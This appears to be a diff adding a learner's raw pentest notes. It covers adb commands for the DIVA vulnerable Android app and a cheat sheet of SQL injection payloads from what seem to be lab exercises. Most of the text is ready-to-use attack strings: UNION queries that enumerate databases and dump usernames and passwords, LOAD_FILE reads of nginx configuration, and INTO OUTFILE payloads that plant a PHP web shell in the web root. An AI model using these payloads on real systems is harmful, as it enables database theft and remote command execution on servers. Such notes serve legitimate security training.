@@ -1,0 +1,88 @@
+Insecuere Logging 
+
+#get current screen in code 
+adb shell dumpsys window | grep -i mCurrentFocus
+
+@get all logs
+adb logcat --pid=$(adb shell pidof -s jakhar.aseem.diva)
+
+# see all granted permissions
+adb shell dumpsys package com.jakhar.aseem.diva | grep granted=true
+
+#give some permission 
+adb shell pm grant jakhar.aseem.diva android.permission.WRITE_EXTERNAL_STORAGE
+adb shell pm grant jakhar.aseem.diva android.permission.ACCESS_MEDIA_LOCATION
+
+
+# Hard coded creds
+simly user leave it like this in app xd 
+
+
+#Insecure DataStorge
+cd /data/data/appaname/shared_prefs/
+EncryptedSharedPreferences
+
+
+#Insecure DataStorge2
+cd /data/data/jakhar.aseem.diva/databases/
+adb pull /data/data/jakhar.aseem.diva/databases/ids2
+sqlite3 ids2
+
+#Insecure DataStorge3
+a52sxq:/data/data/jakhar.aseem.diva # ls
+cache  code_cache  databases  shared_prefs  uinfo268240288616305590tmp
+at uinfo268240288616305590tmp                                             <
+Ahmed :121212
+
+#
+#input1 
+zz' or 1==1 -- -
+
+# input 2 (no schema defined in webview)
+file:///etc/hosts
+
+
+
+'UNION select 1,2,3,schema_name from INFORMATION_SCHEMA.SCHEMATA -- -
+
+zzz'UNION select 1,2,3,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight' -- -
+
+zzz'UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users' -- -
+
+zzz'UNION select 1,2,username,password from users where username='newuser' -- -
+
+
+cn' UNION SELECT 1,2 ,variable_name ,variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+
+zzz'UNION select "","","",'<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'
+
+' or '1'='1
+
+admin') union select 1,2,3,4-- -
+
+
+# + 1  What is the root path of the web application?
+
+# if u use nginix 
+try read /etc/nginx/nginx.conf
+cn ' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/nginx/nginx.conf" ), 4-- -
+
+/etc/nginx/sites-enabled/*; } 
+we need to fuzz for * 
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -request conf.req -fs 5369
+result dfault
+
+cn') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
+
+OR
+
+#according to chatgpt
+cn') union select 1,2,LOAD_FILE('/etc/nginx/sites-available/default'),4-- -
+
+ /var/www/chattr-prod; location 
+
+
+cn ') union select "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/chattr-prod/shell.php'-- -
